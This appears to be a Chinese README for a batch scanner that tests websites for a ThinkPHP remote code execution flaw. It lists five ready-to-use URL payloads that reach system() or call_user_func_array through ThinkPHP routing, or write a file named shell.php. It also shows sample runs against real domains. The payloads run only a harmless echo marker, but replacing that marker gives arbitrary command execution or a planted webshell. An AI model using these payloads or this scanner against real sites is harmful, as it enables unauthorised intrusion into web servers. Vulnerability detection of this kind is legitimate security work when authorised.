# thinkPHPBatchPoc

thinkPHPBatchPoc 是thinkPHP代码执行批量检测工具

## 工具所使用的payload

```
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20www_admintony_com

?s=index/\think\Request/input&filter=system&data=echo%20www_admintony_com

?s=index/\think\view\driver\Php/display&content=%3C?php%20echo%20www_admintony_com;?%3E

?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20www_admintony_com

?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20echo%20"www_admintony_com";?%3E
```

# 工具使用方法

```
PS E:\PyProject> python .\thinkPHPBatchPoc.py
thinkPHPBatchPoc
Author: Admintony @ 2018.12.13
Blog: http://www.admintony.com
免责声明: 脚本仅用于批量检测站点是否存在漏洞，请勿用于非法用途，否则作者不担负任何责任。

usage:
thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞
thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞
```

## 针对单个目标进行测试

```
PS E:\PyProject> python .\thinkPHPBatchPoc.py -u admintony.com
[+] http://admintony.com is vulnerable
[+] Payload is ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20www_admintony_com
```

## 批量测试

```
PS E:\PyProject> python .\thinkPHPBatchPoc.py -f .\target.txt
[+]Testing http://www.admintony.com
[-] http://www.admintony.com is not vulnerable

[+]Testing http://baidu.com
[-] http://baidu.com is not vulnerable

[+]Testing vulW3b.admintony.com/
[+] http://vulW3b.admintony.com/ is vulnerable
[+] Payload is ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20www_admintony_com
```

# 博客地址

[thinkPHPBatchPoc](http://www.admintony.com/thinkPHPBatchPoc.html)
